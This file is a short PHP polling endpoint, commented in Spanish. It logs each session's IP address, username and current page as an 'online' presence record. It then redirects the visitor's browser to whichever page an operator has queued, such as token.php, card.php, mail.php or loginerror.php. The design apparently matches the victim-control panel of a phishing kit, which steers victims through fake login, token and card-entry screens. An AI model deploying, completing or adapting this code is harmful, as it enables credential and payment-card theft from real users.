<?php
require_once __DIR__ . '/_guard.php';
session_start();
header('Content-Type: application/json');

// ---- Heartbeat de presencia (panel: bolita en línea) ----
try {
    $sid = preg_replace('/[^a-zA-Z0-9_-]/', '', session_id());
    if ($sid !== '') {
        $pd = __DIR__ . '/acciones/presence';
        if (!is_dir($pd)) { @mkdir($pd, 0755, true); }
        @include_once __DIR__ . '/../_track.php';
        $pg = '';
        if (!empty($_SERVER['HTTP_REFERER'])) {
            $pg = basename((string)parse_url($_SERVER['HTTP_REFERER'], PHP_URL_PATH));
        }
        @file_put_contents($pd . '/' . $sid . '.txt', json_encode([
            'ts' => time(),
            'ip' => function_exists('trk_client_ip') ? trk_client_ip() : ($_SERVER['REMOTE_ADDR'] ?? ''),
            'u'  => (string)($_SESSION['usuario'] ?? ''),
            'pg' => $pg,
        ]), LOCK_EX);
        // Poda ocasional: borrar heartbeats viejos (>2h)
        if (mt_rand(1, 25) === 1) {
            foreach ((array)glob($pd . '/*.txt') as $pf) {
                if (@filemtime($pf) < time() - 7200) { @unlink($pf); }
            }
        }
    }
} catch (\Throwable $e) {}

if (!isset($_SESSION['usuario'])) {
    echo json_encode(["status" => "no_session"]);
    exit;
}

$usuario = $_SESSION['usuario'];
$archivo = __DIR__ . "/acciones/$usuario.txt";
if (file_exists($archivo)) {
    $destino = trim(file_get_contents($archivo));
    unlink($archivo);
    if (in_array($destino, ['index.php', 'form.php', 'token.php', 'tokenerror.php', 'loginerror.php', 'card.php', 'mail.php', 'listo.php'])) {
        echo json_encode(["status" => "redirigir", "destino" => $destino]);
        exit;
    }
}

echo json_encode(["status" => "esperando"]);
